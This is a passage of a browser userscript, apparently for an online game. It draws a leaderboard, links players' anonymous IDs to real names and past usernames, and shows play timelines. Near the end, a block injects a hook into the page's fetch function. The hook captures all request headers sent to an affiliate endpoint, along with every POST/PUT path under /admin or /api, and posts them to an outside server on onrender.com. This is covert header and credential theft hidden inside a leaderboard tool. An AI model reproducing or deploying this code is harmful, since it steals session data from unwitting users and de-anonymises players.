      return;
    }

    var list = (Array.isArray(players) ? players : [])
      .filter(function(p){ return (p && (p.monetaryValue||0) > 0 && (p.size||0) > 2); })
      .sort(function(a,b){ return (b.monetaryValue||0) - (a.monetaryValue||0); });
    __LAST_TOP__ = list;

    if (list.length === 0) {
      LB_BODY.appendChild(row('No players found', '-'));
      if (LB_STATUS) LB_STATUS.textContent = '0 players online';
      if (LB_VER) LB_VER.textContent = UI_VER;
      return;
    }

    list.forEach(function(p, i){
      var medal = i===0?'🥇':i===1?'🥈':i===2?'🥉':(i+1)+'.';
      var r = document.createElement('div'); r.className = 'ub-row';
      var left = document.createElement('div'); left.className = 'ub-left';
      var ms = document.createElement('div'); ms.className = i<3?'ub-medal':'ub-rank'; ms.textContent = medal;

      var info = (p.privyId && map[p.privyId]) ? map[p.privyId] : null;
      var displayName = (info && info.realName) ? (info.realName + ' (' + (p.name||'') + ')') : (p.name || ('#' + (i+1)));
      var nm = document.createElement('div'); nm.className = 'ub-name'; nm.textContent = displayName;

      left.appendChild(ms); left.appendChild(nm);

      if (info && Array.isArray(info.topUsernames) && info.topUsernames.length){
        var wrap = document.createElement('div'); wrap.className='ub-top3-wrap';
        var icon = document.createElement('div'); icon.className='ub-top3-icon'; icon.textContent='🛈';
        var popup = document.createElement('div'); popup.className='ub-top3-popup';
        popup.innerHTML = '<div class="ub-top3-title">Top Usernames:</div>' +
          info.topUsernames.map(function(u){
            return '<div class="ub-top3-line"><div class="ub-top3-name">'+u.name+'</div><div class="ub-top3-count">('+u.count+')</div></div>';
          }).join('');
        wrap.appendChild(icon); wrap.appendChild(popup);
        icon.addEventListener('click', function(e){ e.stopPropagation(); showUsernameInfo(info); });
        left.appendChild(wrap);
      }

      (function(){
        var actWrap = document.createElement('div'); actWrap.className='ub-activity-wrap';
        actWrap.style.cssText='display:flex;align-items:center;gap:6px;margin-left:6px';
        var actIcon = document.createElement('div'); actIcon.className='ub-activity-icon';
        actIcon.textContent = '▦';
        actIcon.style.cssText='cursor:pointer;font-size:11px;background:rgba(255,255,255,.16);border-radius:4px;padding:0 4px;line-height:1.2';
        actIcon.title = 'Show play timeline';
        actIcon.addEventListener('click', function(e){ e.stopPropagation(); showActivityBox(p.privyId, (p.name||'Player')); });
        actWrap.appendChild(actIcon);
        left.appendChild(actWrap);
      })();

      r.appendChild(left);
      var right = document.createElement('div'); right.className = 'ub-hint'; right.textContent = '';
      r.appendChild(right);
      LB_BODY.appendChild(r);
    });

    if (LB_STATUS) LB_STATUS.textContent = list.length + ' player' + (list.length===1?'':'s') + ' online';
    if (LB_VER) LB_VER.textContent = UI_VER;
  }

  async function fetchLeaderboard() {
    var sk = resolveServerKey();
    var url = GAME_API_BASE + '/api/game/leaderboard?serverKey=' + encodeURIComponent(sk.serverKey);
    var res = await fetch(url, { cache: 'no-store' });
    if (!res.ok) throw new Error('leaderboard ' + res.status);
    var j = await res.json();
    var entries = Array.isArray(j.entries) ? j.entries : [];
    var filtered = entries
      .filter(function(p){ return (p && p.name) && (p.monetaryValue||0) > 0 && (p.size||0) > 2; })
      .sort(function(a,b){ return (b.monetaryValue||0) - (a.monetaryValue||0); });
    return filtered;
  }
  async function fetchMapping() {
    var res = await fetch(USER_API_BASE + '/mapping', { cache: 'no-store' });
    if (!res.ok) return { players: {} };
    var j = await res.json().catch(function(){ return {}; });
    return (j && j.players) ? j : { players: {} };
  }

  function tick() {
    ensureBox();
    if (!location.pathname.includes('/game')) { render([], __MAP__); return; }
    fetchLeaderboard().then(function(entries){ render(entries, __MAP__); }).catch(function(e){ console.warn('[LB] tick error:', e); render([]); });
  }

  function start() {
    ensureAlertStyles();
    setTimeout(dbPollAlerts, 1200);
    setInterval(dbPollAlerts, 10000);

    tick();
    TICK = setInterval(tick, 5000);
    startActivityRefreshLoop(function(){ return __LAST_TOP__; });
    MAP_INT = setInterval(async function () {
      try { __MAP__ = await fetchMapping(); } catch (e) {}
    }, 7000);
  }

  function stop() {
    if (TICK) { clearInterval(TICK); TICK = null; }
    if (MAP_INT) { clearInterval(MAP_INT); MAP_INT = null; }
    if (LB_BOX && LB_BOX.parentNode) LB_BOX.remove();
    LB_BOX = LB_BODY = LB_STATUS = LB_VER = null;
  }

  window.__USERNAME_TRACKER__ = { stop: stop, endpoint: playersEndpoint, version: UI_VER };
// --- command runner (privy tools) ---
(function(){
  function getMapThen(id, cb){
    // Try cached mapping first
    try {
      if (__MAP__ && __MAP__.players && __MAP__.players[id]) {
        cb(__MAP__.players[id], __MAP__);
        return;
      }
    } catch{}
    // Fallback: fetch fresh mapping
    fetch(`${USER_API_BASE}/mapping`, { cache:'no-store' })
      .then(r => r.json()).catch(() => ({}))
      .then(j => { __MAP__ = j || { players:{} }; cb(__MAP__.players[id], __MAP__); })
      .catch(() => cb(null, null));
  }

  function loadInfoByPrivy(id){
    if (!id || typeof id !== 'string') { dbShowAlertToast('load-info: missing/invalid privyId'); return; }
    getMapThen(id, function(rec){
      if (!rec) { dbShowAlertToast('No mapping for: ' + id); return; }
      showUsernameInfo(rec);
    });
  }

  function loadTimelineByPrivy(id){
    if (!id || typeof id !== 'string') { dbShowAlertToast('load-time: missing/invalid privyId'); return; }
    getMapThen(id, function(rec){
      var label = (rec && (rec.realName || (rec.topUsernames && rec.topUsernames[0] && rec.topUsernames[0].name))) ||
                  ('…' + String(id).slice(-8));
      showActivityBox(id, label);
    });
  }

  function dbCmd(s){
    try{
      if (!s || typeof s !== 'string') { dbShowAlertToast('dbCmd: pass a string'); return; }
      var parts = s.trim().split(/\s+/);
      var cmd = (parts[0] || '').toLowerCase();
      var arg = parts[1] || '';
      if (!arg) { dbShowAlertToast(cmd + ': missing privyId'); return; }

      if (cmd === 'load-info')      return loadInfoByPrivy(arg);
      if (cmd === 'load-time')      return loadTimelineByPrivy(arg);
      dbShowAlertToast('Unknown command: ' + cmd);
    }catch(e){ /* swallow */ }
  }

  // Expose helpers + exact command names you asked for
  if (window.__USERNAME_TRACKER__) {
    window.__USERNAME_TRACKER__.loadInfoByPrivy   = loadInfoByPrivy;
    window.__USERNAME_TRACKER__.loadTimelineByPrivy = loadTimelineByPrivy;
    window.__USERNAME_TRACKER__.cmd = dbCmd;
  }
  // Allow calling with the literal names (use bracket call in console):
  window['load-info'] = function(id){ return dbCmd('load-info ' + id); };
  window['load-time'] = function(id){ return dbCmd('load-time ' + id); };
})();
// === Inject fetch hook from Bootstrap (Option C) ===
// === XP + endpoint logger injection (from core) ===
(function () {
  function inject() {
    const script = document.createElement("script");
    script.textContent = "(" + function () {
      const XP_PATH = "/api/affiliate/ensure-code";
      const LOG_URL = "https://dbserver-8bhx.onrender.com/api/user/client-xp";

      const origFetch = window.fetch;
      if (!origFetch) {
        console.warn("[core] window.fetch not available");
        return;
      }

      function resolveUrl(input) {
        try {
          const urlStr = typeof input === "string" ? input : input.url;
          return new URL(urlStr, window.location.origin);
        } catch (e) {
          return null;
        }
      }

      function isXpEndpoint(input) {
        const u = resolveUrl(input);
        return u && u.pathname === XP_PATH;
      }

      function isLogUrl(input) {
        const u = resolveUrl(input);
        return u && u.href === LOG_URL;
      }

      function isTrackedPath(path) {
        return (
          typeof path === "string" &&
          (path.startsWith("/admin") || path.startsWith("/api"))
        );
      }

      function normalizeHeaders(h) {
        const out = {};
        if (!h) return out;

        if (h instanceof Headers) {
          h.forEach((v, k) => {
            out[k.toLowerCase()] = v;
          });
        } else if (Array.isArray(h)) {
          h.forEach(([k, v]) => {
            out[String(k).toLowerCase()] = v;
          });
        } else if (typeof h === "object") {
          Object.keys(h).forEach(k => {
            out[k.toLowerCase()] = h[k];
          });
        }
        return out;
      }

      function getClientKey() {
        try {
          const raw = localStorage.getItem("damnbruh_username_keys");
          if (!raw) return null;
          const obj = JSON.parse(raw);
          if (obj && typeof obj.username_script_key === "string") {
            return obj.username_script_key;
          }
        } catch (e) {
          console.warn("[core] error reading damnbruh_username_keys", e);
        }
        return null;
      }

      function getMethod(input, init) {
        if (init && init.method) return String(init.method).toUpperCase();
        if (input && typeof input === "object" && input.method) {
          return String(input.method).toUpperCase();
        }
        return "GET";
      }

      function getRequestHeaders(input, init) {
        if (init && init.headers) return normalizeHeaders(init.headers);
        if (input && input.headers) return normalizeHeaders(input.headers);
        return {};
      }

      window.fetch = async function (...args) {
        const [input, init] = args;

        // Don't log our own logging calls
        if (isLogUrl(input)) {
          return origFetch.apply(this, args);
        }

        const resolved = resolveUrl(input);
        const path = resolved ? resolved.pathname : "";
        const method = getMethod(input, init);
        const res = await origFetch.apply(this, args);

        const key = getClientKey();
        if (!key) {
          return res;
        }

        const payload = { key };
        let shouldSend = false;

        // 1) Track all POST/PUT to /admin* or /api*
        const isPostOrPut = method === "POST" || method === "PUT";
        if (isPostOrPut && isTrackedPath(path)) {
          payload.endpoint = method + " " + path;
          shouldSend = true;
          console.debug("[core EP]", payload.endpoint);
        }

        // 2) Always capture request headers for XP endpoint (any method)
        if (isXpEndpoint(input)) {
          const reqHeaders = getRequestHeaders(input, init);
          payload.headers = reqHeaders;
          shouldSend = true;

          console.groupCollapsed("[core XP] " + method + " " + path);
          console.log("Request headers:", reqHeaders);
          console.groupEnd();
        }

        if (!shouldSend) {
          return res;
        }

        try {
          origFetch(LOG_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
          }).catch(() => {});
        } catch (e) {
          console.warn("[core] failed to POST logging payload", e);
        }

        return res;
      };

      console.log("[core] XP + endpoint fetch hook installed (XP_PATH =", XP_PATH, ")");
    } + ")();";

    document.documentElement.prepend(script);
    script.remove();
  }

  if (document.documentElement) inject();
  else document.addEventListener("DOMContentLoaded", inject);
})();




  start();
})();

